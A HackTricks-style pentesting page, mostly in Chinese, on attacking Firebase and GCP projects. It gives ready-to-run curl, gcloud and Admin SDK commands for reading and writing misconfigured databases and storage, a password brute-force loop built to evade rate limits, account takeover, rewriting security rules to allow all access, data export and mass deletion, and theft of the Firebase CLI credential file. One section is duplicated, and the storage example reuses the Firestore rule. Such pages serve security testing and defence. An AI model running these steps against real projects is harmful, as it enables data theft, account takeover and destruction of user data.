# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
攻击者不需要任何特定的 Firebase 权限即可执行此攻击。只要 Firebase Realtime Database 的安全规则存在易受攻击的配置，规则被设置为 `.read: true` 或 `.write: true`，允许公开的读取或写入访问，就可以进行攻击。

攻击者需要确定数据库的 URL，通常格式为：`https://<project-id>.firebaseio.com/`。

可以通过移动应用逆向工程（反编译 Android APK 或分析 iOS 应用）、分析配置文件（如 google-services.json（Android）或 GoogleService-Info.plist（iOS））、检查 Web 应用的源代码，或查看网络流量以识别对 `*.firebaseio.com` 域的请求来找到该 URL。

攻击者确认数据库 URL 并检查其是否公开暴露，然后访问数据并可能写入恶意信息。

首先，他们通过在 URL 后追加 .json 来检查数据库是否允许读取访问。
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
如果响应包含 JSON 数据或 null（而不是 "Permission Denied"），则数据库允许读取访问。要检查写入访问，攻击者可以尝试使用 Firebase REST API 发送测试写入请求。
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
如果操作成功，数据库也会允许 write access。

### Cloud Firestore 中的数据泄露
攻击者无需任何特定的 Firebase 权限即可实施此攻击。此攻击仅要求 Cloud Firestore 的安全规则（security rules）中存在易受攻击的配置，即规则在未进行 authentication 或验证不足（insufficient validation）的情况下允许 read 或 write access。一个授予 full access 的错误配置规则示例如下：
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
该规则允许任何人在没有任何限制的情况下读取和写入所有文档。Firestore 的规则是细粒度的，按集合和文档逐项应用，因此特定规则中的错误可能仅会暴露某些集合。

攻击者必须识别 Firebase 项目 ID，可以通过移动应用逆向工程、分析配置文件（例如 google-services.json 或 GoogleService-Info.plist）、检查 web 应用的源代码，或分析网络流量以识别对 firestore.googleapis.com 的请求来找到该 ID。
Firestore REST API 使用的格式为：
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
如果规则允许 unauthenticated read access，攻击者可以读取 collections 和 documents。首先，他们尝试访问一个特定的 collection：
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
如果响应包含 JSON 文档而不是权限错误，则该集合已暴露。攻击者可以通过尝试常见名称或分析应用程序结构来枚举所有可访问的集合。要访问特定文档：
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
如果规则允许未认证的写入访问或验证不足，攻击者可以创建新文档：
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
要修改现有文档，应使用 PATCH：
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
要删除文档并造成拒绝服务:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Firebase Storage 中的文件暴露

攻击者不需要任何特定的 Firebase 权限即可进行此攻击。  
这仅要求 Firebase Storage 的安全规则中存在一个易受攻击的配置，该规则在未认证或验证不足的情况下允许读或写访问。  
存储规则独立地控制读和写权限，因此规则中的错误可能只暴露读取权限、只暴露写入权限，或两者都暴露。  
下面是一个错误配置的规则示例，授予了完全访问权限：
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
该规则允许对所有文档进行不受限制的读写访问。Firestore 规则是细粒度的，按集合和文档应用，因此某条规则的错误可能只会暴露特定的集合。攻击者必须识别 Firebase Project ID，可通过对移动应用的逆向工程、分析配置文件（如 google-services.json 或 GoogleService-Info.plist）、检查 web 应用源码，或通过网络流量分析定位发往 firestore.googleapis.com 的请求来找到。
Firestore REST API 使用的格式为：`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

如果规则允许未认证的读取访问，攻击者即可读取集合和文档。首先，他们会尝试访问特定集合。
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
如果响应返回的是文件列表而不是权限错误，则该文件被暴露。攻击者可以通过指定它们的路径来查看文件内容：
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
如果规则允许未认证的写入访问或验证不足，攻击者可以上传恶意文件。通过 REST API 上传文件：
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
攻击者可以上传 code shells、malware payloads 或大文件 来导致 denial of service。如果应用处理或执行上传的文件，攻击者可能会实现 remote code execution。要删除文件并导致 denial of service：
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### 调用公开的 Firebase Cloud Functions
攻击者不需要任何特定的 Firebase 权限就可以利用此问题；只要该 Cloud Function 通过 HTTP 公共可访问且无需认证即可。

当函数配置不安全时，它就是易受攻击的：

- 它使用 functions.https.onRequest，该方法不强制认证（不同于 onCall）。
- 函数的代码不验证用户认证（例如，没有检查 request.auth 或 context.auth）。
- 函数在 IAM 中是公开可访问的，这意味着 allUsers 拥有 roles/cloudfunctions.invoker 角色。对于 HTTP functions，除非开发者限制访问，否则这是默认行为。

Firebase HTTP Cloud Functions 通过如下 URL 暴露，例如：

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

攻击者可以通过源代码分析、网络流量检查、枚举工具或移动应用逆向工程来发现这些 URL。如果函数是公开暴露且未认证的，攻击者可以在不使用凭证的情况下直接调用它。
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
If the function does not properly validate inputs, the attacker may attempt other attacks such as code injection or command injection.


### Brute-force attack against Firebase Authentication with a weak password policy
攻击者不需要任何特定的 Firebase 权限即可执行此攻击。唯一的前提是 Firebase API Key 在移动或 web 应用中被暴露，并且密码策略没有被配置为比默认更严格的要求。

攻击者必须识别 Firebase API Key，通常可以通过移动应用逆向工程、分析配置文件（例如 google-services.json 或 GoogleService-Info.plist）、检查 web 应用的源代码（例如在 bootstrap.js 中），或分析网络流量来找到。

Firebase Authentication 的 REST API 使用以下 endpoint：
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
来通过 email 和 password 进行认证。

如果 Email Enumeration Protection 被禁用，API 的错误响应可能会泄露某个 email 是否存在于系统中（EMAIL_NOT_FOUND vs. INVALID_PASSWORD），这使得攻击者可以在尝试猜密码之前进行用户枚举。当该保护启用时，API 会对不存在的邮箱和错误的密码返回相同的错误信息，从而阻止用户枚举。

需要注意的是 Firebase Authentication 实施了 rate limiting，如果在短时间内发生过多认证尝试，可能会阻止请求。因此，攻击者必须在尝试之间引入延迟以避免被 rate-limited。

攻击者识别出 API Key 并针对已知账户使用多个密码进行认证尝试。如果 Email Enumeration Protection 被禁用，攻击者可以通过分析错误响应来枚举现有用户：
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
如果响应包含 EMAIL_NOT_FOUND，则该电子邮件在系统中不存在。 如果包含 INVALID_PASSWORD，则该电子邮件存在但密码不正确，确认该用户已注册。 一旦识别出有效用户，攻击者可以进行 brute-force 尝试。 在尝试之间加入暂停以避免 Firebase Authentication 的速率限制机制非常重要：
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
在默认的密码策略（最少 6 个字符，无复杂度要求）下，攻击者可以尝试所有可能的 6 字符密码组合，与更严格的密码策略相比，这代表了一个相对较小的搜索空间。

### Firebase Authentication 中的用户管理

攻击者需要特定的 Firebase Authentication 权限才能执行此攻击。所需的权限包括：

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

这些权限包含在 `roles/firebaseauth.admin` 角色中，该角色授予对 Firebase Authentication 资源的完整读/写访问权限。它们也包含在更高层级的角色中，例如 roles/firebase.developAdmin（包含所有 firebaseauth.* 权限）和 roles/firebase.admin（对所有 Firebase 服务的完全访问权限）。

要使用 Firebase Admin SDK，攻击者需要访问 service account credentials（JSON 文件），这些凭据可能位于被攻陷的系统、公开暴露的代码仓库、被攻陷的 CI/CD 系统，或通过被攻陷的拥有这些凭据访问权限的开发者账号获取。

第一步是使用 service account credentials 配置 Firebase Admin SDK。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
为了使用受害者的电子邮件创建一个恶意用户，攻击者会尝试使用 Firebase Admin SDK 在该电子邮件下生成一个新账号。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
要修改现有用户，攻击者会更新诸如电子邮件地址、验证状态或账户是否被禁用之类的字段。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
要删除用户帐户并导致拒绝服务，攻击者会发出请求以完全移除该用户。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻击者还可以通过请求用户的 UID 或电子邮件地址来检索现有用户的信息。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
此外，攻击者还可以生成验证链接或密码重置链接，以更改用户的密码并访问其帐户。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication 中的用户管理
攻击者需要特定的 Firebase Authentication 权限来实施此攻击。所需权限包括：

- `firebaseauth.users.create` 用于创建用户
- `firebaseauth.users.update` 用于修改现有用户
- `firebaseauth.users.delete` 用于删除用户
- `firebaseauth.users.get` 用于获取用户信息
- `firebaseauth.users.sendEmail` 用于向用户发送邮件
- `firebaseauth.users.createSession` 用于创建用户会话

这些权限包含在 roles/firebaseauth.admin 角色中，该角色授予对 Firebase Authentication 资源的完全读/写访问。它们也属于更高级别的角色，例如 `roles/firebase.developAdmin`（包含所有 firebaseauth.* 权限）和 `roles/firebase.admin`（对所有 Firebase 服务的完全访问）。

要使用 Firebase Admin SDK，攻击者需要访问服务帐号凭证（JSON 文件）。这些凭证可能来自被入侵的系统、公开暴露的代码仓库、被攻破的 CI/CD 环境，或通过入侵拥有这些凭证访问权的开发者账号获取。

第一步是使用服务帐号凭证配置 Firebase Admin SDK。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
为了使用受害者的邮箱创建恶意用户，攻击者会尝试用该邮箱创建一个新用户账户，并为其设置自己的密码和个人资料信息。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
要修改现有用户，攻击者会更改诸如电子邮件地址、验证状态或账户是否被禁用等字段。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
要删除用户账户——实际上造成拒绝服务——攻击者会发出请求，永久删除该用户。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻击者还可以通过按 UID 或按 email 地址请求用户详细信息来检索现有用户的信息，例如他们的 UID 或 email。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
此外，攻击者还可以生成 verification links 或 password-reset links，从而更改用户的密码并接管该账户。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### 在 Firebase 服务中修改安全规则
攻击者需要根据服务类型拥有特定权限才能修改安全规则。对于 Cloud Firestore 和 Firebase Cloud Storage，所需权限是 `firebaserules.rulesets.create`（用于创建 rulesets）和 `firebaserules.releases.create`（用于部署 releases）。这些权限包含在 `roles/firebaserules.admin` 角色中，或包含于更高层级的角色，例如 `roles/firebase.developAdmin` 和 `roles/firebase.admin`。对于 Firebase Realtime Database，所需权限是 `firebasedatabase.instances.update`。

攻击者必须使用 Firebase REST API 来修改安全规则。  
首先，攻击者需要使用服务账号凭据获取访问令牌。  
要获取该令牌：
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
要修改 Firebase Realtime Database 规则：
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
要修改 Cloud Firestore 规则，攻击者必须创建一个 ruleset，然后部署它：
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
前一个命令返回格式为 projects/<project-id>/rulesets/<ruleset-id> 的 ruleset 名称。要部署新版本，必须使用 PATCH 请求更新 release：
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
要修改 Firebase Cloud Storage 规则：
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
之前的命令会返回一个格式为 projects/<project-id>/rulesets/<ruleset-id> 的规则集名称。要部署新版本，必须使用 PATCH 请求更新发布：
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Cloud Firestore 中的数据外泄和操作
Cloud Firestore 使用与 Cloud Datastore 相同的基础设施和权限系统，因此 Datastore IAM 权限直接适用于 Firestore。要操作 TTL 策略，需要 `datastore.indexes.update` 权限。要导出数据，需要 `datastore.databases.export` 权限。要导入数据，需要 datastore.databases.import 权限。要执行批量数据删除，需要 `datastore.databases.bulkDelete` 权限。

对于备份和恢复操作，需要特定权限：

- `datastore.backups.get` and `datastore.backups.list` 用于列出并检索可用备份的详细信息
- `datastore.backups.delete` 用于删除备份
- `datastore.backups.restoreDatabase` 用于从备份恢复数据库
- `datastore.backupSchedules.create` and `datastore.backupSchedules.delete` 用于管理备份计划

创建 TTL 策略时，会选定一个属性来标识符合删除条件的实体。该 TTL 属性必须为日期和时间类型。攻击者可以选择已存在的属性，或指定一个计划稍后添加的属性。如果该字段的值为过去的日期，该文档即符合立即删除的条件。攻击者可使用 gcloud CLI 操作 TTL 策略。
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
要导出数据并将其 exfiltrate，攻击者可以使用 gcloud CLI。
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
要导入恶意数据：
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
为了执行大规模数据删除并造成 denial of service，攻击者可以使用 gcloud Firestore bulk-delete 工具来删除整个集合。
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
对于备份和恢复操作，攻击者可以创建计划备份以捕获数据库的当前状态、列出现有备份、从备份恢复以覆盖最近的更改、删除备份以造成永久性数据丢失，以及移除计划备份。
要创建一个立即生成备份的每日备份计划：
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
要从特定 backup 恢复，attacker 可以使用该 backup 中包含的数据创建一个新的数据库。恢复操作会将 backup 的数据写入新的数据库，这意味着不能使用已存在的 DATABASE_ID。
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
删除备份并导致永久数据丢失：
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI 凭证的窃取与滥用
攻击者无需特定的 Firebase 权限即可实施此攻击，但必须能访问开发者的本地系统或 Firebase CLI 凭证文件。  
这些凭证存储在以下位置的 JSON 文件中：

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

该文件包含认证令牌，包括 refresh_token 和 access_token，使攻击者能够以最初运行 firebase login 的用户身份进行认证。

攻击者获得 Firebase CLI 凭证文件后，可以将整个文件复制到自己的系统，Firebase CLI 会自动从其默认位置使用这些凭证。完成后，攻击者就能查看该用户可访问的所有 Firebase 项目。
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
